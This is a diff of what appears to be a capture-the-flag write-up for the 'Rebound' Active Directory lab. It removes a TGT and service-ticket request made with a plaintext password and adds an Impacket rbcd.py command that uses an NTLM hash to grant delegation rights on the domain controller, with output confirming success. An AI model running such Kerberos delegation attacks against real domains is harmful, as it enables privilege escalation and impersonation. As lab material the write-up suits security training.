@@ -454,23 +454,18 @@ delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Trans
 ```
 
 ```python
-faketime -f +7h nxc smb dc01.rebound.htb -u 'oorend' -p '1GR8t@$$4u' --generate-tgt oorend -k
-SMB         dc01.rebound.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         dc01.rebound.htb 445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
-SMB         dc01.rebound.htb 445    DC01             [+] TGT saved to: oorend.ccache
-SMB         dc01.rebound.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=oorend.ccache
-```
-This generated a TGT for user without an SPN which is important here
-
-```python
-faketime -f +7h getST.py \
-  -k -no-pass \
-  -spn 'cifs/dc01.rebound.htb' \
-  rebound.htb/oorend  
+faketime -f +7h rbcd.py 'rebound.htb/delegator$' -hashes ':aafb74ba2eb5e5ff7003a9a54ad1f904' -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip dc01.rebound.htb -use-ldaps
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Getting ST for user
-[*] Saving ticket in oorend@cifs_dc01.rebound.htb@REBOUND.HTB.ccache
+[-] CCache file is not found. Skipping...
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
 ```
-This has given me a TGS for the user authenticating to `delegator$`
+This set the delegation
 
+```python
+
+```
